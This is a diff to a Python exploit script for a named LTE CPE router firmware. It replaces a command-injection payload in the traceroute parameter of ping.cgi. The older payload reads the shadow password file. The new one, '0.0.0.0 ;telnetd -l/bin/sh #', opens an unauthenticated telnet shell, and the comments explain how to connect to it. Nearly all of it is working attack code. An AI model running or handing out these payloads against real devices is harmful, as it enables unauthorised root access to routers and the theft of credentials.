@@ -1,30 +1,31 @@
 #!/usr/bin/env python3
 
-#########################################################################
+########################################################################################################
 #
 # LTE CPE B2268S Router
 # version: V100R001C35SP100B529
 #
-# Partial command injection, vulnerability in the traceroute command
+# Busybox Command Injection, vulnerability in the traceroute command
 #
 # Payload: 
 # data = {
 #   'authToken': token, <= retrieved by get_token() method
 #   'ping': '2', => traceroute
-#   'IPaddress': '127.0.0.1 && cat /etc/sh* && wc -l',
+#   'IPaddress': '0.0.0.0 ;telnetd -l/bin/sh #',
 # } POST => ping.cgi
 #
-# The use of the * is mandatory because it's seems that the command is
-# being truncated after x chars, alos the # or any other, still don't
-# know why, will figure that out 
-#
-# Still need another type of injection as bruteforcing the shadow file
-# might take a long time, maybe try more with the ping command
+# the "telnetd -l/bin/sh" cmd opens a shell without loging in when connecting
+# with telnet: telnet 192.168.1.1 23 => shell
+# Spend most of time trying to shorten the payload as it seems to be truncated
+# after x amount of characters.
 #
 # This corporate fuckery is insane, they sell you something you can't
 # control, even the most basic stuff
 #
-#########################################################################
+# This is what helped the most:
+# https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/
+#
+########################################################################################################
 
 import requests
 import re
@@ -102,11 +103,8 @@ def main():
 
     if authToken is not None:
         test_login()
-        #test_ping('2', '127.0.0.1 && ls -a | base64 && wc -l')
-        #___________________________________________
-        test_ping('2', '127.0.0.1 && cat /etc/sh* #')
-    
-
+        #test_ping('2', '0.0.0.0 ;cat /etc/sh* #')
+        test_ping('2', '0.0.0.0 ;telnetd -l/bin/sh #')
 
 if __name__ == "__main__":
     main()
